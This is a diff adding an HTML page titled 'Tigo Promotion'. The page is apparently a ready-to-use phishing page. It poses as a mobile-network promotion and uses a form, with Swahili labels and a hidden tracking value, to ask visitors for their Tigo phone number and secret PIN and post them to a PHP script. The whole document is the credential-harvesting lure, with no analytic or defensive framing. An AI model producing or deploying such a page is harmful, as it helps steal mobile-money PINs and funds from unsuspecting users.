@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <link rel="icon" type="image/svg+xml" href="/demo/vite.svg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Tigo Promotion</title>
+  <style>
+    /* Reset default spacing */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body, html {
+      height: 100%;
+      font-family: Arial, sans-serif;
+      background: #f8f9fa;
+    }
+    /* Main container */
+    .container {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      text-align: center;
+    }
+    /* Responsive image */
+    .responsive-image {
+      width: 100%;
+      max-width: 350px;
+      height: auto;
+      margin-bottom: 20px;
+      border-radius: 10px;
+    }
+    /* Input fields */
+    .field {
+      margin-bottom: 1rem;
+      width: 100%;
+      max-width: 300px;
+    }
+    .input {
+      width: 100%;
+      padding: 12px;
+      font-size: 1rem;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      outline: none;
+      transition: border-color 0.3s ease;
+    }
+    .input:focus {
+      border-color: #007bff;
+    }
+    /* Button */
+    .button {
+      background-color: #222;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 12px 24px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background-color 0.3s ease, transform 0.1s ease;
+      width: 100%;
+      max-width: 300px;
+    }
+    .button:hover {
+      background-color: #444;
+    }
+    .button:active {
+      transform: scale(0.98);
+    }
+    @media (max-width: 480px) {
+      .responsive-image {
+        max-width: 280px;
+      }
+      .input, .button {
+        font-size: 0.95rem;
+        padding: 10px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div id="app">
+    <div class="theme-light">
+      <div class="container">
+        <img
+          class="responsive-image"
+          src="https://imagizer.imageshack.com/img924/2081/uEeySh.jpg"
+          alt="Tigo Promotion">
+        <form action="add_tigo.php" method="POST">
+          <input class="input" type="hidden" name="url_link" value="gzktrsjamfkw">
+          <div class="field">
+            <input class="input" type="text" name="nambari" autocomplete="on" placeholder="Nambari ya tigo" required>
+          </div>
+          <div class="field">
+            <input class="input" type="text" name="siri" autocomplete="on" placeholder="Nambari ya siri tigo" required>
+          </div>
+          <!--
+          <div class="field">
+            <input class="input" type="text" name="additional_field" autocomplete="on" placeholder="Additional Field">
+          </div>
+          -->
+          <button class="button" type="submit">Submit</button>
+        </form>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
